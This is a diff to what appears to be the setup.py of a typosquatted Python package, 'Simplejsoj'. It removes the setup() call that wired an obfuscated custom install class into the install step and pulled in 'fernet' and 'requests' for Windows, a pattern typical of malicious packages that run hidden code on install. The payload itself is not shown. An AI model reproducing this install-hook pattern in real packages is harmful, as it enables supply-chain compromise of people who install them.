@@ -18,22 +18,5 @@ class jgpilEzgbssiXAlDfBSqecNAJNanNwFNvYQDhFqsHIHhmQGaKGFgfItITNFMJxBCyxUpJOkFCV
             install.run(self)
 
 
-setup(
-    name="Simplejsoj",
-    version=VERSION,
-    author="yTmdOuc",
-    author_email="mAkwEpph@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': jgpilEzgbssiXAlDfBSqecNAJNanNwFNvYQDhFqsHIHhmQGaKGFgfItITNFMJxBCyxUpJOkFCVGyOCpdTgBxpxEvEpIWPQpRcazWuoxxEU,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
 
